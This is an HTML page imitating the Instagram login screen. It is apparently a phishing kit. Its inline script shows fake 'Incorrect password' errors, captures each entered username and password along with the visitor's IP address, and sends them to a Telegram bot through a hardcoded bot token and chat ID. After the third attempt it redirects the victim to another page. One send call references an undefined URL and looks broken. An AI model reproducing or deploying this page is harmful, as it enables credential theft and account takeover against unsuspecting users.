<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- FAVICON -->
    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,500;1,700&display=swap" rel="stylesheet">
    <!-- APP CSS -->
    <link rel="stylesheet" href="./app.css">

    <style>
        .error-message {
            color: red;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="main-container">
        <div class="main-content">
            <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                <div class="slide-content" id="slide-content">
                    <img src="./images/slide (1).jpg" alt="slide image" class="active">
                    <img src="./images/slide (2).jpg" alt="slide image">
                    <img src="./images/slide (3).jpg" alt="slide image">
                    <img src="./images/slide (4).jpg" alt="slide image">
                    <img src="./images/slide (5).jpg" alt="slide image">
                </div>
            </div>
            <div class="form-container">
                <form id="contactForm">
                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>
                        <div class="signin-form" id="signin-form">
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>Phone number, username or email</span>
                                    <input type="text" name="username" id="username" required>
                                    <input type="hidden" name="_captcha" value="false">
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>Password</span>
                                    <input type="password" name="password" id="password" required>
                                    <button type="button" onclick="togglePassword()">Show</button>
                                </div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-login" type="submit">Log In</button>
                            </div>
                            <div class="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div id="error-message" class="error-message"></div>
                            <div class="btn-group">
                                <button class="btn-fb">
                                    <img src="./images/facebook-icon.png" alt="">
                                    <span>Log in with Facebook</span>
                                </button>
                            </div>
                            <a href="#" class="forgot-pw">Forgot password?</a>
                        </div>
                    </div>
                    <div class="box goto">
                        <p>Don't have an account? <a href="#">Sign up</a></p>
                    </div>

                    <div class="app-download">
                        <p>Get the app.</p>
                        <div class="store-link">
                            <a href="#"><img src="./images/app-store.png" alt="app store"></a>
                            <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
                        </div>
                    </div>
                    <input type="hidden" id="attempt" name="attempt" value="0">
                    <input type="hidden" name="ip_address" id="ip_address">
                </form>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#" id="darkmode-toggle">Darkmode</a>
        </div>
        <div class="copyright">
            Â© 2024 Instagram from Facebook
        </div>
    </div>
</div>

<!-- APP JS -->
<script src="app.js"></script>

<script>
    let attemptCount = 0;

    function togglePassword() {
        var passwordInput = document.getElementById("password");
        var showButton = passwordInput.nextElementSibling;
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            showButton.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            showButton.textContent = "Show";
        }
    }

    function handleLogin(event) {
        event.preventDefault();
        attemptCount++;
        const form = document.getElementById("contactForm");
        const errorMessage = document.getElementById("error-message");

        // Fetch IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('ip_address').value = data.ip;
                sendMessage(data.ip);
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
                sendMessage('IP fetch failed');
            });

        function sendMessage(ipAddress) {
            if (attemptCount < 3) {
                document.getElementById("attempt").value = "Attempt " + attemptCount;
                errorMessage.textContent = "Incorrect password. Try again.";

                // Prepare the message to send to Telegram
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const textMessage = `*New login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ipAddress}`;

                // Send the message using fetch
                fetch(url, {

                }).then(response => response.json()).then(data => {
                    if (data.ok) {
                        console.log('Message sent successfully!');
                    } else {
                        console.log('Failed to send message.');
                    }
                }).catch(error => {
                    console.error('Error:', error);
                    console.log('Error sending message.');
                });

                // Hide the error message when the user starts typing again
                document.getElementById("username").addEventListener("input", () => errorMessage.textContent = "");
                document.getElementById("password").addEventListener("input", () => errorMessage.textContent = "");
            } else {
                // On the third attempt, redirect to another page
                document.getElementById("attempt").value = "Final Attempt";

                // Prepare the message to send to Telegram
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const textMessage = `*Final login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ipAddress}`;

                const chatId = '6735326282'; // Replace with your chat ID
                const token = '7387417554:AAGlNvhvGOnXZ4v15HXb-ctWhm2m6YzaAT0'; // Replace with your bot token

                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;

                // Send the message using fetch
                fetch(url, {
                    method: "POST"
                }).then(response => response.json()).then(data => {
                    if (data.ok) {
                        console.log('Final message sent successfully!');
                    } else {
                        console.log('Failed to send final message.');
                    }
                }).catch(error => {
                    console.error('Error:', error);
                    console.log('Error sending final message.');
                });

                // Redirect to the new URL
                window.location.href = "flock.html"; // Replace with the actual URL you want to redirect to
            }
        }
    }

    document.getElementById("contactForm").addEventListener("submit", handleLogin);
</script>
</body>
</html>
